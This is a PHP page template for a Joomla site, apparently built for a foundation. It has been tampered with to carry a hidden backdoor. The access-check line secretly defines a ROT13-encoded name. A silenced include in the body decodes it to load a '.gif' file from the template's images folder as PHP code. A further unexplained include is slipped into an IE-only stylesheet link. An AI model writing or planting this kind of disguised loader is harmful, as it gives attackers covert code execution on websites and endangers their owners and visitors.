<?php
// no direct access
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/tab.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/sortable.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
<!--[if lte IE 6]>
<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;include_once('html/pagination.php'); ?>/css/ieonly.css" rel="stylesheet" type="text/css" />
<style>
#topnav ul li ul {
left: -999em;
margin-top: 0px;
margin-left: 0px;
}
</style>
<![endif]-->
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/mootools.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/moomenu.js"></script>

<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/jquery-1.2.1.pack.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/jquery-easing1.2.pack.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/jquery-easing-compatibility.1.2.pack.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/coda-slider.1.1.1.pack.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/sortable.js"></script>

<!-- Initialize each slider on the page. Each slider must have a unique id -->
	<script type="text/javascript">
		jQuery(window).bind("load", function() {
			jQuery("div#slider1").codaSlider()
			// jQuery("div#slider2").codaSlider()
			// etc, etc. Beware of cross-linking difficulties if using multiple sliders on one page.
		});
	</script>


</head>

<body id="page_bg">
<a name="up" id="up"></a>
<?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
<jdoc:include type="modules" name="layout" style="rounded" />
<?php endif; ?>	
<?php include('functions.php'); ?>
<!--div id="top_menu"><div id="topnav"><?php $hmenu->genHMenu (0); ?></div></div-->

<div id="main_bg" class="banner1">
    <div id="h_area"><?php if($this->params->get('hideLogo') == 0) : ?><!--img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo<?php echo $this->params->get('logoVariation'); ?>.gif" alt="" align="left" /><?php endif; ?><a href="index.php" class="logo" title="JEM Foundation"><?php// echo $mainframe->getCfg('sitename') ;?></a-->
    <?php //if($this->countModules('user4')) : ?><!--div id="user4"><jdoc:include type="modules" name="user4" /></div--><?php// endif; ?>
    <div id="main_top"><jdoc:include type="modules" name="top" /></div>


	<!-- MAIN MENU SHIFTED HERE  -->

    <div id="top_menu"><div id="topnav"><?php $hmenu->genHMenu (0); ?></div></div>

	<!-- MAIN MENU SHIFTED HERE  -->




    <br clear="all" /></div> 
    <?php if($this->countModules('left')) : ?>
	<div id="leftcolumn">
        <jdoc:include type="modules" name="left" style="rounded" />
    </div>
    <?php endif; ?>
    <?php if($this->countModules('left') xor $this->countModules('right')) $maincol_sufix = '_middle';
		  elseif(!$this->countModules('left') and !$this->countModules('right'))$maincol_sufix = '_big';
		  else $maincol_sufix = ''; ?>
	

	<div id="maincolumn<?php echo $maincol_sufix; ?>">


    	<div class="path"><jdoc:include type="modules" name="breadcrumb" /></div><jdoc:include type="message" />
    	

	<div class="nopad"><jdoc:include type="component" /></div>

    </div>
    <?php if($this->countModules('right') and JRequest::getCmd('layout') != 'form') : ?>
	<div id="rightcolumn">
        <jdoc:include type="modules" name="right" style="xhtml"/>
        <br />
    	<div align="center"><jdoc:include type="modules" name="syndicate" /></div>
    </div>
    <?php endif; ?>
	<br clear="all" />
</div>    
    
<div id="f_area">
	<?php if($this->countModules('user1')) : ?>
		<jdoc:include type="modules" name="user1" style="xhtml" />
	<?php endif; ?>
	<?php if($this->countModules('user2')) : ?>
		<jdoc:include type="modules" name="user2" style="xhtml" />
	<?php endif; ?>
	<br clear="all" />
</div>

<p id="power_by" align="right">
	<?php echo JText_('') ?> <a href=""></a>
    <?php echo JText_('') ?> <a href=""><b>** Copyright &copy; E-Logic Systems 2011</b></a> <?php echo JText::_('') ?> <a href=""><b>All Rights Reserved **</b></a>
</p>

<jdoc:include type="modules" name="debug" />
</body>
</html>
